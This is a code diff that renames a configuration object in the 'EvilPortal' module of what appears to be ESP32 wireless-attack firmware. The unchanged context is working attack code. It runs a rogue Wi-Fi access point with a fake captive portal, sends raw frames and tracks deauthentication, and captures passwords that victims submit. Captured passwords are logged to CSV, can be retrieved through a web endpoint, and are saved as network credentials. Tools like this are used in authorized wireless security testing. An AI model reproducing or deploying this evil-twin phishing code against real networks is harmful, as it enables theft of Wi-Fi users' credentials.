@@ -39,12 +39,12 @@ void EvilPortal::CaptiveRequestHandler::handleRequest(AsyncWebServerRequest *req
     if (url == "/") _portal->portalController(request);
     else if (url == "/post") _portal->credsController(request);
     else if (
-        url == bruceConfig.evilPortalEndpoints.getCredsEndpoint &&
-        bruceConfig.evilPortalEndpoints.allowGetCreds
+        url == mopieConfig.evilPortalEndpoints.getCredsEndpoint &&
+        mopieConfig.evilPortalEndpoints.allowGetCreds
     )
         request->send(200, "text/html", _portal->creds_GET());
     else if (
-        url == bruceConfig.evilPortalEndpoints.setSsidEndpoint && bruceConfig.evilPortalEndpoints.allowSetSsid
+        url == mopieConfig.evilPortalEndpoints.setSsidEndpoint && mopieConfig.evilPortalEndpoints.allowSetSsid
     ) {
         if (request->hasArg("ssid")) {
             _portal->apName = request->arg("ssid").c_str();
@@ -61,7 +61,7 @@ void EvilPortal::CaptiveRequestHandler::handleRequest(AsyncWebServerRequest *req
 
 bool EvilPortal::setup() {
     if (apGateway == IPAddress((uint32_t)0)) {
-        if (!apGateway.fromString(bruceConfig.evilPortalGatewayIp)) apGateway = IPAddress(172, 0, 0, 1);
+        if (!apGateway.fromString(mopieConfig.evilPortalGatewayIp)) apGateway = IPAddress(172, 0, 0, 1);
     }
 
     if (_autoMode) {
@@ -94,13 +94,13 @@ bool EvilPortal::setup() {
     wsl_bypasser_send_raw_frame(&ap_record, _channel);
 
     if (apName.isEmpty()) {
-        if (bruceConfig.evilWifiNames.empty()) {
+        if (mopieConfig.evilWifiNames.empty()) {
             apName_from_keyboard();
         } else {
             options = {
                 {"Custom Wifi", [this]() { apName_from_keyboard(); }}
             };
-            for (const auto &_wifi : bruceConfig.evilWifiNames) {
+            for (const auto &_wifi : mopieConfig.evilWifiNames) {
                 options.emplace_back(_wifi.c_str(), [this, _wifi]() { this->apName = _wifi; });
             }
             loopOptions(options);
@@ -110,7 +110,7 @@ bool EvilPortal::setup() {
     options = {
         {"Default",
          [this]() {
-             if (!apGateway.fromString(bruceConfig.evilPortalGatewayIp)) apGateway = IPAddress(172, 0, 0, 1);
+             if (!apGateway.fromString(mopieConfig.evilPortalGatewayIp)) apGateway = IPAddress(172, 0, 0, 1);
          }                                                                 },
         {"172.0.0.1",   [this]() { apGateway = IPAddress(172, 0, 0, 1); }  },
         {"192.168.4.1", [this]() { apGateway = IPAddress(192, 168, 4, 1); }},
@@ -225,15 +225,15 @@ void EvilPortal::setupRoutes() {
     webServer.on("/", [this](AsyncWebServerRequest *request) { portalController(request); });
     webServer.on("/post", [this](AsyncWebServerRequest *request) { credsController(request); });
 
-    if (bruceConfig.evilPortalEndpoints.allowGetCreds) {
+    if (mopieConfig.evilPortalEndpoints.allowGetCreds) {
         webServer.on(
-            bruceConfig.evilPortalEndpoints.getCredsEndpoint.c_str(),
+            mopieConfig.evilPortalEndpoints.getCredsEndpoint.c_str(),
             [this](AsyncWebServerRequest *request) { request->send(200, "text/html", creds_GET()); }
         );
     }
-    if (bruceConfig.evilPortalEndpoints.allowSetSsid) {
+    if (mopieConfig.evilPortalEndpoints.allowSetSsid) {
         webServer.on(
-            bruceConfig.evilPortalEndpoints.setSsidEndpoint.c_str(), [this](AsyncWebServerRequest *request) {
+            mopieConfig.evilPortalEndpoints.setSsidEndpoint.c_str(), [this](AsyncWebServerRequest *request) {
                 if (request->hasArg("ssid")) {
                     apName = request->arg("ssid").c_str();
                     request->send(200, "text/html", ssid_POST());
@@ -434,14 +434,14 @@ void EvilPortal::drawScreen() {
 
     String apIp = WiFi.softAPIP().toString();
     padprintln("");
-    if (bruceConfig.evilPortalEndpoints.showEndpoints) {
-        if (bruceConfig.evilPortalEndpoints.allowGetCreds) {
-            padprintln("-> " + apIp + bruceConfig.evilPortalEndpoints.getCredsEndpoint + " -> get creds");
+    if (mopieConfig.evilPortalEndpoints.showEndpoints) {
+        if (mopieConfig.evilPortalEndpoints.allowGetCreds) {
+            padprintln("-> " + apIp + mopieConfig.evilPortalEndpoints.getCredsEndpoint + " -> get creds");
         } else {
             padprintln("-> cred access disabled");
         }
-        if (bruceConfig.evilPortalEndpoints.allowSetSsid) {
-            padprintln("-> " + apIp + bruceConfig.evilPortalEndpoints.setSsidEndpoint + " -> set ssid");
+        if (mopieConfig.evilPortalEndpoints.allowSetSsid) {
+            padprintln("-> " + apIp + mopieConfig.evilPortalEndpoints.setSsidEndpoint + " -> set ssid");
         } else {
             padprintln("-> SSID change disabled");
         }
@@ -459,7 +459,7 @@ void EvilPortal::drawScreen() {
         padprint("Attempt: " + String(totalCapturedCredentials));
     }
     String passMode = "";
-    switch (bruceConfig.evilPortalPasswordMode) {
+    switch (mopieConfig.evilPortalPasswordMode) {
         case FULL_PASSWORD: passMode = "Full"; break;
         case FIRST_LAST_CHAR: passMode = "p******d"; break;
         case HIDE_PASSWORD: passMode = "*hidden*"; break;
@@ -489,7 +489,7 @@ void EvilPortal::printDeauthStatus() {
     } else {
         tft.setTextColor(TFT_RED);
         printFootnote("Deauth ON");
-        tft.setTextColor(bruceConfig.priColor);
+        tft.setTextColor(mopieConfig.priColor);
     }
 }
 
@@ -692,7 +692,7 @@ void EvilPortal::credsController(AsyncWebServerRequest *request) {
 
         if (key == "password") {
             char blank = '*';
-            switch (bruceConfig.evilPortalPasswordMode) {
+            switch (mopieConfig.evilPortalPasswordMode) {
                 case FULL_PASSWORD: break;
                 case FIRST_LAST_CHAR:
                     if (valueBuffer.length() > 2) {
@@ -720,8 +720,8 @@ void EvilPortal::credsController(AsyncWebServerRequest *request) {
             lastCred += "valid: true\nStopping server...";
             saveToCSV(csvLine + ", valid: true", true);
             printDeauthStatus();
-            if (bruceConfig.getWifiPassword(apName) != "") {
-                bruceConfig.addWifiCredential(apName, passwordValue);
+            if (mopieConfig.getWifiPassword(apName) != "") {
+                mopieConfig.addWifiCredential(apName, passwordValue);
             }
             vTaskDelay(50 / portTICK_PERIOD_MS);
             verifyPass = true;
@@ -802,7 +802,7 @@ String EvilPortal::creds_GET() {
 String EvilPortal::ssid_GET() {
     return getHtmlTemplate(
         "<p>Set a new SSID for Evil Portal:</p><form action='" +
-        bruceConfig.evilPortalEndpoints.setSsidEndpoint +
+        mopieConfig.evilPortalEndpoints.setSsidEndpoint +
         "' id='login-form'><input name='ssid' "
         "class='input-field' type='text' placeholder='" +
         apName + "' required><button id=submitbtn class=submit-btn type=submit>Apply</button></div></form>"
